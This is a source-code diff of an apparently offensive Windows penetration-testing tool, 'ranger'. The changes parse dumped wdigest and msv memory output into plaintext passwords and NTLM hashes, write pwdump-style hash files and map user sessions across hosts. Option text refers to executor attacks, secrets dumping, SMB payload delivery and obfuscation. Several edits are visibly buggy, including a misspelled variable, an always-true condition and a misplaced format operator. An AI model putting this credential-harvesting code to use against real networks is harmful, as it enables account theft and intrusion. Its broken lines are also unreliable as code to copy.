                         elif "Username" in item:
-                            indicator2, raw_username = item.split(':')
+                            indicator2, raw_username = item.split(':',1)
                         elif "Password" in item:
-                            indicator3, raw_password = item.split(':')
+                            indicator3, raw_password = item.split(':',1)
                         else:
                             continue
                     else:
@@ -4346,22 +4554,28 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
                     raw_password = None
                 if (raw_domain and raw_username) and "null" not in (raw_domain and raw_username):
                     keyed = raw_domain + "\\" + raw_username
-                    wdigest_dict[keyed] = [raw_domain, raw_username, raw_password]
+                    if keyed in wdigest_dict:
+                        test_d, test_u, test_p = wdigest_dict[keyed]
+                        if test_p == None and raw_pasword:
+                            wdigest_dict[keyed] = [raw_domain, raw_username, raw_password]
+                    else:    
+                        wdigest_dict[keyed] = [raw_domain, raw_username, raw_password]
                 else:
                     continue               
             except Exception as e:
-                notice = "An error occurred: %s" % (e)
-                #logger_obj.info(notice)            
+                notice = "[!] An error occurred: %s" % (e)
+                notice = failure + notice + cleanup
+                logger_obj.info(notice)            
     for k, v in msv_results.iteritems():
         try:
             for item in v:
                 if "Domain" or "Username" or "NTLM" in item:
                     if "Domain" in item:
-                        idicator1, raw_domain = item.split(':')
+                        idicator1, raw_domain = item.split(':',1)
                     elif "Username" in item:
-                        indicator2, raw_username = item.split(':')
+                        indicator2, raw_username = item.split(':',1)
                     elif "NTLM" in item:
-                        indicator3, raw_NTLM = item.split(':')
+                        indicator3, raw_NTLM = item.split(':',1)
                     else:
                         continue
                 else:
@@ -4385,29 +4599,39 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
                 raw_NTLM = None
             if (raw_domain and raw_username) and "null" not in (raw_domain and raw_username):
                 keyed = raw_domain + "\\" + raw_username
-                msv_dict[keyed] = [raw_domain, raw_username, raw_NTLM]
+                if keyed in msv_dict:
+                    test_d, test_u, test_ntlm = msv_dict[keyed]
+                    if test_ntlm == None and raw_NTLM:
+                        msv_dict[keyed] = [raw_domain, raw_username, raw_NTLM]
+                else:
+                    msv_dict[keyed] = [raw_domain, raw_username, raw_NTLM]
             else:
                 continue
         except Exception as e:
-            notice = "An error occurred: %s" % (e)
-            #logger_obj.info(notice)
+            notice = "[!] An error occurred: %s" % (e)
+            notice = failure + notice + failure
+            logger_obj.info(notice)
     for k, v in msv_dict.iteritems():
         dom_temp = v[0].lower()
         usr_temp = v[1].lower()
         NTLM_temp = v[2]
         if dom_temp and usr_temp:
             temp_key = dom_temp + "\\" + usr_temp
-            message, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
-            message_list.append(message)
+            message_list_temp, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
+            message_list.extend(message_list_temp)
             try:
                 if not NTLM_temp:
-                    message = "[-] %s\\%s NTLM hash was nullified in memory \n" % (str(dom_temp), str(usr_temp))
+                    message = "[-] %s\\%s NTLM hash was nullified in memory" % (str(dom_temp), str(usr_temp))
+                    message = failure + message + cleanup
                     message_list.append(message)
                 else:
-                    message = "[++] %s\\%s NTLM hash is %s \n" % (str(dom_temp), str(usr_temp), str(NTLM_temp))
+                    message = "[++] %s\\%s NTLM hash is %s" % (str(dom_temp), str(usr_temp), str(NTLM_temp))
+                    message = epic + message + cleanup
                     message_list.append(message)
             except Exception as e:
-                print("An error occurred recording NTLM: %s") % (e)
+                notice = "[!] An error occurred recording NTLM: %s" % (e)
+                notice = failure + notice + cleanup
+                logger_obj.info("[!] An error occurred recording NTLM: %s") % (e)
         else:
             continue
         if temp_key in creds_dict:
@@ -4434,17 +4658,21 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
         pwd_temp = v[2]
         if dom_temp and usr_temp:
             temp_key = dom_temp + "\\" + usr_temp
-            message, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
-            message_list.append(message)        
+            message_list_temp, creds_dict = logged_in_users_method(verbose, creds_dict, dom_temp, dst, data_null, usr_temp)
+            message_list.extend(message_list_temp)       
             try:
                 if not pwd_temp:
-                    message = "[-] %s\\%s password was nullified in memory \n" % (str(dom_temp), str(usr_temp))
+                    message = "[-] %s\\%s password was nullified in memory" % (str(dom_temp), str(usr_temp))
+                    message = failure + message + cleanup
                     message_list.append(message)
                 else:
-                    message = "[++] %s\\%s password is %s \n" % (str(dom_temp), str(usr_temp), str(pwd_temp))
+                    message = "[++] %s\\%s password is %s" % (str(dom_temp), str(usr_temp), str(pwd_temp))
+                    message = epic + message + cleanup
                     message_list.append(message)
             except Exception as e:
-                print("An error occurred recording passwords: %s") % (e)
+                notice = "[!] An error occurred recording passwords: %s" % (e)
+                notice = failure + notice + cleanup
+                logger_obj.info(notice)
         else:
             continue
         if temp_key in creds_dict:
@@ -4466,66 +4694,79 @@ def invoker_parser(verbose, creds_dict, data, logger_obj, dst, dom = None, pwd =
 #creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp=[], groups_temp={}, logged_in_temp=[]}
 
 def pwdump_writer(creds_dict, recovery, logger_obj):
-    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
+    set = ""
     hash_list = []
     if recovery:
         pwdump = "/opt/ranger/results/recovery/recovery_pwdump"
     else:
-        pwdump = "/opt/ranger/results/credentials/pwdump_" + st
+        pwdump = "/opt/ranger/results/credentials/pwdump"
     try:
         for k, v in creds_dict.iteritems():
-            if v[0] and v[1] and v[2]:
-                set = v[4] + ":" + v[0] + ":" + v[1] + ":" + v[2] + ":::"
+            if v[0] and v[1] and v[2] and v[4] and v[6]:
+                set = str(v[4]) + ":" + str(v[0]) + ":" + str(v[1]) + ":" + str(v[2]) + "::: " + str(v[6])
                 hash_list.append(set)
-        with open(pwdump, 'w') as f:
-            for hash in hash_list:
-                f.write(hash + '\n')
+            elif v[0] and v[1] and v[2] and v[4]:
+                set = str(v[4]) + ":" + str(v[0]) + ":" + str(v[1]) + ":" + str(v[2]) + "::: " + str(v[6])
+                hash_list.append(set)
+            elif not v[0] and v[1] and v[2] and v[4] and v[6]:
+                set = str(v[6]) + "\\" + v[4] + ":" + str(v[1]) + ":" + str(v[2]) + ":::"
+                hash_list.append(set)
+        remove_dup_line_in_file(pwdump, hash_list, recovery, logger_obj)
     except Exception as e:
-        notice = "An error occurred: %s" % (e)
+        notice = "[!] An error occurred: %s" % (e)
+        notice = failure + notice + cleanup
         logger_obj.info(notice)
     return(pwdump)
 
 def access_to_writer(creds_dict, recovery, logger_obj):
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
     map_list = []
-    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if recovery:
         access_to = "/opt/ranger/results/recovery/recovery_access_to_"
     else:
-        access_to = "/opt/ranger/results/credentials/access_to_" + st
+        access_to = "/opt/ranger/results/credentials/access_to"
     try:
         for k, v in creds_dict.iteritems():
             if v[10]:
                 accesses = ','.join(map(str, v[10]))
                 set = k + ":" + accesses
                 map_list.append(set)
-        with open(access_to, 'w') as f:
-            for mapping in map_list:
-                f.write(mapping + '\n')
+        remove_dup_line_in_file(access_to, map_list, recovery, logger_obj)
     except Exception as e:
-        notice = "An error occurred: %s" % (e)
+        notice = "[!] An error occurred: %s" % (e)
+        notice = failure + notice + cleanup
         logger_obj.info(notice)
     return(access_to)
 
 def logged_in_writer(creds_dict, recovery, logger_obj):
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
     map_list = []
-    st = datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d-%H:%M:%S')
     if recovery:
-        access_to = "/opt/ranger/results/recovery/recovery_logged_in_to"
+        logged_in_to = "/opt/ranger/results/recovery/recovery_logged_in_to"
     else:
-        access_to = "/opt/ranger/results/credentials/logged_in_to_" + st
+        logged_in_to = "/opt/ranger/results/credentials/logged_in_to"
     try:
         for k, v in creds_dict.iteritems():
             if v[9]:
                 locations = ','.join(map(str, v[9]))
                 set = k + ":" + locations
                 map_list.append(set)
-        with open(access_to, 'w') as f:
-            for mapping in map_list:
-                f.write(mapping + '\n')
+        remove_dup_line_in_file(logged_in_to, map_list, recovery, logger_obj)
     except Exception as e:
         notice = "An error occurred: %s" % (e)
+        notice = failure + notice + cleanup
         logger_obj.info(notice)
-    return(access_to)
+    return(logged_in_to)
 
 def data_writer(creds_dict, dst, final_targets, recovery, logger_obj):
     fn = matrix_write(creds_dict, recovery, logger_obj)
@@ -4542,6 +4783,31 @@ def data_writer(creds_dict, dst, final_targets, recovery, logger_obj):
     fn = logged_in_writer(creds_dict, recovery, logger_obj)
     print("[+] Wrote the current user's session locations to the following file: %s") % (fn)
 
+def remove_dup_line_in_file(file_to_order, current_list, recovery, logger_obj):
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
+    lines = []
+    try:
+        if (os.path.isfile(file_to_order) and os.stat(file_to_order).st_size != 0) and not recovery:
+            lines = open(file_to_order).read().splitlines()
+            os.remove(file_to_order)
+            lines = list(lines)
+        if current_list:
+            lines.extend(current_list)
+        if lines and lines != None:
+            unique_lines = OrderedDict.fromkeys((line for line in lines if line))
+            with open(file_to_order, 'w') as f:
+                for item in unique_lines:
+                    if not item:
+                        continue
+                    f.write(item + '\n')
+    except (Exception, KeyboardInterrupt), e:
+        notice = "[!] An error occurred: %s" % (e)
+        notice = failure + notice + cleanup
+        logger_obj.info(notice)
+
 def logged_in_users_method(verbose, creds_dict, dom, dst, data = None, usr = None):
     temp_list = []
     SID_temp = None
@@ -4554,9 +4820,15 @@ def logged_in_users_method(verbose, creds_dict, dom, dst, data = None, usr = Non
     logged_in_temp = []
     access_to_temp = []
     local_admin_temp = []
+    local_users = []
     groups_temp = {}
     cached_temp = None
+    cleanup = (colorama.Style.RESET_ALL)
+    success = (colorama.Fore.GREEN)
+    failure = (colorama.Fore.RED)
+    epic = (colorama.Fore.YELLOW)
     message = ""
+    message_list = []
     if data:
         for line in data.splitlines():
             mutate = []
@@ -4570,33 +4842,42 @@ def logged_in_users_method(verbose, creds_dict, dom, dst, data = None, usr = Non
             if not (dom_temp is dom):
                 dom_temp = "WORKGROUP"
             temp_key = dom_temp.lower() + "\\" + usr_temp.lower()
-            message += "[+] %s is logged into %s \n" % (temp_key, ip)
+            message = "[+] %s is logged into %s" % (temp_key, ip)
+            message = success + message + cleanup
+            message_list.append(message)
+            message = ""
+            local_users.append(temp_key)
     else:
         dom_temp = dom.lower()
         ip = dst
         temp_key = dom_temp.lower() + "\\" + usr_temp.lower()
-        message = "[+] %s is logged into %s \n" % (temp_key, ip)
-    if temp_key in creds_dict:
-        creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-        logged_in_temp = creds_dict[temp_key][9]
-        access_to_temp = creds_dict[temp_key][10]
-        logged_in_temp.append(ip)
-        set = sets.Set(logged_in_temp)
-        logged_in_temp = list(set)
-        access_to_temp.append(ip)
-        set = sets.Set(access_to_temp)
-        access_to_temp = list(set)
-        creds_dict[temp_key][9] = logged_in_temp
-        creds_dict[temp_key][10] = access_to_temp
-    else:
-        logged_in_temp.append(ip)
-        set = sets.Set(logged_in_temp)
-        logged_in_temp = list(set)
-        access_to_temp.append(ip)
-        set = sets.Set(access_to_temp)
-        access_to_temp = list(set)
-        creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
-    return(message, creds_dict)
+        message = "[+] %s is logged into %s" % (temp_key, ip)
+        message = success + message + cleanup
+        message_list.append(message)
+        message = ""
+        local_users.append(temp_key)
+    for temp_key in local_users:
+        if temp_key in creds_dict:
+            creds_dict = in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+            logged_in_temp = creds_dict[temp_key][9]
+            access_to_temp = creds_dict[temp_key][10]
+            logged_in_temp.append(ip)
+            set = sets.Set(logged_in_temp)
+            logged_in_temp = list(set)
+            access_to_temp.append(ip)
+            set = sets.Set(access_to_temp)
+            access_to_temp = list(set)
+            creds_dict[temp_key][9] = logged_in_temp
+            creds_dict[temp_key][10] = access_to_temp
+        else:
+            logged_in_temp.append(ip)
+            set = sets.Set(logged_in_temp)
+            logged_in_temp = list(set)
+            access_to_temp.append(ip)
+            set = sets.Set(access_to_temp)
+            access_to_temp = list(set)
+            creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
+    return(message_list, creds_dict)
 
 def access_to_method(verbose, creds_dict, dom, data, usr, pwd, ip):
     temp_list = []
@@ -4627,7 +4908,17 @@ def access_to_method(verbose, creds_dict, dom, data, usr, pwd, ip):
         creds_dict = not_in_cred_dict(verbose, temp_list, SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp, groups_temp, logged_in_temp, temp_key, creds_dict, access_to_temp, cached_temp)
     return(creds_dict)
 
-
+def purging_func():
+    dir_list = []
+    dir_list = ['/opt/ranger/log','/opt/ranger/results/secrets_dump','/opt/ranger/results/invoker','/opt/ranger/results/groups','/opt/ranger/results/logged_in_users','/opt/ranger/results/command','/opt/ranger/results/downloader','/opt/ranger/results/credentials','/opt/ranger/results/recovery']
+    for dir in dir_list:
+        print("[*] Deleting the contents of %s") % (dir)
+        file_list = os.listdir(dir)
+        for filename in file_list:
+            item = os.path.join(dir, filename)
+            if os.path.isfile(item):
+                os.remove(item)
+    sys.exit("[*] Completed purging old engagement files!")
 
 def main():
     # If script is executed at the CLI
@@ -4669,12 +4960,14 @@ Create Pasteable Executor Attack:
     group1 = parser.add_argument_group('Method')
     group2 = parser.add_argument_group('Attack')
     group3 = parser.add_argument_group('SAM and NTDS.DIT Options, used with --secrets-dump')
+    group4 = parser.add_argument_group('Engagement Clean-up')
     iex_options = parser.add_argument_group('Payload options to tell ranger where to source the attack information')
     remote_attack = parser.add_argument_group('Remote Target Options')
     #generator = parser.add_argument_group('Filename for randimization of script')
     obfiscation = parser.add_argument_group('Tools to obfiscate the execution of scripts')
     method = group1.add_mutually_exclusive_group()
     attack = group2.add_mutually_exclusive_group()
+    purging = group4.add_mutually_exclusive_group()
     sam_dump_options = group3.add_mutually_exclusive_group()
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Sets the IP address your attacks will come from defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Sets the interface your attacks will come from if you do not use the default, default eth0")
@@ -4728,11 +5021,12 @@ Create Pasteable Executor Attack:
     obfiscation.add_argument("--no-encoder", dest="encoder", action="store_false", default=True, help="Set to encode the commands that are being executed")
     #obfiscation.add_argument("--delivery", action="store", dest="delivery", choices=['web','smb'], default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
     obfiscation.add_argument("--share-name", action="store", dest="share_name", default="ranger", help="Provide a specific share name to reference with SMB delivery")
+    purging.add_argument("--purge", action="store_true", default=False, dest="purging", help="Purges all previous assessment files")
     parser.add_argument("-l", "--logfile", action="store", dest="log", default="/opt/ranger/log/results.log", type=str, help="The log file to output the results")
     parser.add_argument("-v", action="count", dest="verbose", default=1, help="Verbosity level, defaults to one, this outputs each command and result")
     parser.add_argument("-q", action="store_const", dest="verbose", const=0, help="Sets the results to be quiet")
     parser.add_argument("--update", action="store_true", dest="update", default=False, help="Updates ranger and the supporting libraries")
-    parser.add_argument('--version', action='version', version='%(prog)s 0.69b')
+    parser.add_argument('--version', action='version', version='%(prog)s 0.47b')
 
     args = parser.parse_args()
 
@@ -4852,8 +5146,12 @@ Create Pasteable Executor Attack:
     matrix_list = []
     recovery = False
     cred = None
+    purging = args.purging
     #Credential Matrix
     #creds_dict[temp_key] = [SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp, dom_temp, local_admin_temp=[], groups_temp={}, logged_in_temp=[]}
+
+    if purging:
+        purging_func()
 
     if invoker or downloader or executor:
         powershell = True
@@ -4929,11 +5227,11 @@ Create Pasteable Executor Attack:
         with open(creds_file) as f:
             creds_list = [line.rstrip() for line in f]
         for cred in creds_list:
-            creds_dict = add_to_creds_dict(verbose, creds_dict, dom, cred)
+            creds_dict = add_to_creds_dict(logger_obj, verbose, creds_dict, dom, cred)
     elif usr and pwd:
-        creds_dict = add_to_creds_dict(verbose, creds_dict, dom, cred, usr, pwd)
+        creds_dict = add_to_creds_dict(logger_obj, verbose, creds_dict, dom, cred, usr, pwd)
     #elif creds_matrix and not usr and pwd:
-    #    creds_dict = add_to_creds_dict(verbose, creds_dict, dom, cred, usr, pwd)
+    #    creds_dict = add_to_creds_dict(logger_obj, verbose, creds_dict, dom, cred, usr, pwd)
      
     #print(creds_dict) #DEBUG
 
@@ -4989,6 +5287,9 @@ Create Pasteable Executor Attack:
             if verbose > 1:
                 print("[+] Adding %s to target list") % (entry[1])
             targets_list.append(entry[1])
+        else:
+            if verbose > 1:
+                print("[-] Target %s port %s is not open") % (entry[1], verify_port)
         if verbose > 2:
             print("[*] Hostname: %s IP: %s Protocol: %s Port: %s Service: %s State: %s MAC address: %s" % (entry[0], entry[1], entry[2], entry[3], entry[4], entry[6], entry[5]))
 
@@ -5021,7 +5322,10 @@ Create Pasteable Executor Attack:
         if "tcp" in entry[2] and verify_port in entry[3] and "open" in entry[6]:
             if verbose > 1:
                 print("[+] Adding %s to exceptions list") % (entry[1])
-            targets_list.append(entry[1])
+            exceptions_list.append(entry[1])
+        else:
+            if verbose > 1:
+                print("[-] Target %s port %s is not open and as such will not be added to the exception list") % (entry[1], verify_port)
         if verbose > 2:
             print("[*] Hostname: %s IP: %s Protocol: %s Port: %s Service: %s State: %s MAC address: %s" % (entry[0], entry[1], entry[2], entry[3], entry[4], entry[6], entry[5]))
 
@@ -5195,10 +5499,10 @@ Create Pasteable Executor Attack:
         creds_dict = matrix_read(creds_matrix)
     elif not creds_dict_status and ":" not in pwd:
         sys.exit("[!] The Creds Matrix holds data from other sessions the tool still needs to know what to do, provide an initial credential set to move forward")
-    if ":" in pwd and not usr:
-        SID, LM, NTLM, hash, usr, pwd = pwd_test(pwd, verbose)
-    elif ":" in pwd and usr:
-        SID, LM, NTLM, hash, usr, pwd = pwd_test(pwd, verbose, usr)
+    if pwd and ":" in pwd and not usr and not creds_file:
+        SID, LM, NTLM, hash, usr, pwd, dom_temp = pwd_test(pwd, verbose)
+    elif pwd and usr and ":" in pwd and usr and not creds_file:
+        SID, LM, NTLM, hash, usr, pwd, dom_temp = pwd_test(pwd, verbose, usr)
 
     if powershell and not (downloader or sam_dump):
         try:
